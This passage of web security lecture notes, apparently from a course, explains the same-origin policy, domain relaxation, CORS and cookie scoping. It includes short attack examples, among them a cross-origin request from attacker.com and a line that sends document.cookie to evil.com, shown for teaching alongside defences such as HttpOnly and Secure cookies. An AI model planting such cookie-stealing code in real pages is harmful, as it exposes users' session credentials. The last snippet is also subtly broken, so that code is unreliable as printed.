SOP prevents page from inspecting individual pixels<ul><li>Can check size and loading status</li></ul></li><li>CSS, Fonts: can load and use, but not directly inspect</li><li>Scripts: can be loaded from other origins, scripts execute with privileges of parent frame/windows origin<ul><li>Cannot view source, but can call API functions</li><li>Allows loading library from CDN and using it to alter page</li><li>If a malicious library is loaded, it can also steal data (e.g. cookies)</li></ul></li></ul></li></ul></li></ul></li></ul><h3 id=domain-relaxation>Domain relaxation
<a class=anchor href=#domain-relaxation>#</a></h3><ul><li>Can change <code>document.domain</code> to be a superdomain<ul><li><code>a.domain.com</code> -> <code>domain.com</code> is ok</li><li><code>b.domain.com</code> -> <code>domain.com</code> is ok</li><li><code>a.domain.com</code> -> <code>com</code> is not ok</li><li><code>a.domain.co.uk</code> -> <code>co.uk</code> is not ok</li><li>Checks against Public Suffix List</li></ul></li><li>Domain relaxation attacks:<ul><li><code>malicious.github.io</code> can set domain to <code>github.io</code> and steal GitHub login credentials</li><li>Solution: both sides must set <code>document.domain</code> to <code>github.io</code> to share data (<code>github.io</code> effectively grants permissions)</li></ul></li></ul><h3 id=same-origin-policy-for-javascript>Same-Origin Policy for Javascript
<a class=anchor href=#same-origin-policy-for-javascript>#</a></h3><ul><li>Javascript can make network requests to load additional content or submit forms using XMLHTTPRequests (XHR)<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span>$.ajax({url<span style=color:#ff79c6>:</span> “<span style=color:#ff79c6>/</span>article<span style=color:#ff79c6>/</span>example“, success<span style=color:#ff79c6>:</span> <span style=color:#8be9fd;font-style:italic>function</span>(result){
</span></span><span style=display:flex><span>    $(<span style=color:#f1fa8c>&#34;#div1&#34;</span>).html(result);
</span></span><span style=display:flex><span>}});
</span></span></code></pre></div></li><li>Malicious XHR:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#6272a4>// on attacker.com
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>$.ajax({url<span style=color:#ff79c6>:</span> “https<span style=color:#ff79c6>:</span><span style=color:#6272a4>//bank.com/account“,
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>    success<span style=color:#ff79c6>:</span> <span style=color:#8be9fd;font-style:italic>function</span>(result){
</span></span><span style=display:flex><span>        $(<span style=color:#f1fa8c>&#34;#div1&#34;</span>).html(result);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>});
</span></span></code></pre></div></li><li>Same-Origin Policy for XHR<ul><li>Can only read data from <code>GET</code> responses if they&rsquo;re from same origin, or if destination origin gives permission to read its data</li><li>Cannot make <code>POST</code> or <code>PUT</code> requests to a different origin, unless destination origin grants permissions to do so</li><li>XHR requests (both sending and receiving side) are policed by Cross-Origin Resource Sharing (CORS)</li></ul></li><li>Cross-Origin Resource Sharing (CORS)<ul><li>Reading permission: servers add <code>Access-Control-Allow-Origin</code> header that tells browser to allow Javascript to allow access for another origin</li><li>Sending permission: performs &ldquo;pre-flight&rdquo; permission check to determine whether server is willing to receive request from origin<ul><li>Except for simple requests that could be made without Javascript</li><li>Requests must meet all of following criteria to avoid such a trip:<ol><li>Method: <code>GET</code>, <code>HEAD</code>, <code>POST</code></li><li>If sending data, content type is <code>application/x-www-form-urlencoded</code> or <code>multipart/form-data</code> or <code>text/plain</code></li><li>No custom HTTP headers, only some standardized ones</li></ol></li></ul></li><li>Example: CORS success
<img src=/notes/images/cs155/2022-04-18-cors-success.png alt="CORS success"></li><li>Example: CORS failure
<img src=/notes/images/cs155/2022-04-18-cors-failure.png alt="CORS failure"></li></ul></li></ul><h3 id=same-origin-policy-for-cookies>Same-Origin Policy for Cookies
<a class=anchor href=#same-origin-policy-for-cookies>#</a></h3><ul><li>Cookies have different definition of origin than DOM: <code>(domain, path)</code><ul><li>e.g. <code>(cs155.stanford.edu, /foo/bar)</code></li></ul></li><li>A page can set cookie for its domain or any parent domain (as long as parent domain is not a public suffix)<ul><li>Can set a cookie for its path or any parent path</li><li>e.g. <code>stanford.edu</code> cannot set for <code>cs155.stanford.edu</code>, but vice versa is possible</li><li>e.g. <code>website.com/login</code> can set cookie for <code>website.com</code>, but not vice versa</li></ul></li><li>Browser sends cookies that are in a URL&rsquo;s scope<ul><li>Scope: belongs to domain or parent domain, and is located at the same path or parent path</li></ul></li></ul><h4 id=javascript-cookie-access>Javascript cookie access
<a class=anchor href=#javascript-cookie-access>#</a></h4><ul><li>Developers can additionally manipulate in-scope cookies through Javascript by modifying values in <code>document.cookie</code>:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>document</span>.cookie <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;name=aditya&#34;</span>;
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>function</span> alertCookie() {
</span></span><span style=display:flex><span>    alert(<span style=color:#8be9fd;font-style:italic>document</span>.cookie);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#ff79c6>button</span> <span style=color:#50fa7b>onclick</span><span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#34;alertCookie()&#34;</span>&gt;Show Cookies&lt;/<span style=color:#ff79c6>button</span>&gt;
</span></span></code></pre></div></li><li>This leads to a SOP policy collision. On <code>cs.stanford.edu/zakir</code>, run the following code, which will actually show <code>dabo</code>&rsquo;s cookies on <code>zakir</code>&rsquo;s page:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#ff79c6>const</span> iframe <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>document</span>.createElement(<span style=color:#f1fa8c>&#34;iframe&#34;</span>);
</span></span><span style=display:flex><span>iframe.src <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;https://cs.stanford.edu/dabo&#34;</span>;
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>document</span>.body.appendChild(iframe);
</span></span><span style=display:flex><span>alert(iframe.contentWindow.<span style=color:#8be9fd;font-style:italic>document</span>.cookie);
</span></span></code></pre></div></li></ul><h4 id=third-party-cookie-access>Third-party cookie access
<a class=anchor href=#third-party-cookie-access>#</a></h4><ul><li>If bank inclues Google Analytics Javascript (from <code>google.com</code>), it can access bank&rsquo;s auth. cookie, since Javascript always runs with permissions of the window<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#ff79c6>const</span> img <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>document</span>.createElement(<span style=color:#f1fa8c>&#34;image&#34;</span>);
</span></span><span style=display:flex><span>img.src <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;https://evil.com/?cookies=&#34;</span> <span style=color:#ff79c6>+</span> <span style=color:#8be9fd;font-style:italic>document</span>.cookie;
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>document</span>.body.appendChild(/notes/images/cs155);
</span></span></code></pre></div></li><li>To prevent: HttpOnly Cookies - setting to prevent cookies from being accessed by <code>document.cookie</code> API<ul><li>Never sent by browser because <code>(google.com, /)</code> does not match <code>(bank.com, /)</code></li><li>Cannot be extracted by Google Javascript that runs on <code>bank.com</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span>Set-Cookie: id=a3fWa; Expires=Thu, 21 Apr 2022 16:20:00 GMT; HttpOnly
</span></span></code></pre></div><ul><li>This is OK if everything is done over TLS, so network attacker cannot see traffic</li><li>However, if attacker tricks user into visiting <code>http://bank.com</code>, since there is no scheme in Cookie SOP, attacker can see the cookie</li></ul></li><li>Secure Cookies: only send to server with an encrypted request over HTTPS protocol<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span>Set-Cookie: id=a3fWa; Expires=Thu, 21 Apr 2022 16:20:00 GMT; Secure
</span></span></code></pre></div></li></ul></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#web-security-model>Web Security Model</a><ul><li><a href=#web-security-goals>Web security goals</a></li><li><a href=#attack-models>Attack models</a></li><li><a href=#http-protocol>HTTP protocol</a><ul><li><a href=#http-methods>HTTP methods</a></li><li><a href=#external-resources>External resources</a></li><li><a href=#javascript>Javascript</a></li><li><a href=#session-management-via-cookies>Session management via cookies</a></li></ul></li><li><a href=#web-security-model-1>Web Security Model</a><ul><li><a href=#domain-relaxation>Domain relaxation</a></li><li><a href=#same-origin-policy-for-javascript>Same-Origin Policy for Javascript</a></li><li><a href=#same-origin-policy-for-cookies>Same-Origin Policy for Cookies</a><ul><li><a href=#javascript-cookie-access>Javascript cookie access</a></li><li><a href=#third-party-cookie-access>Third-party cookie access</a></li></ul></li></ul></li></ul></li></ul></nav></div></aside></main></body></html>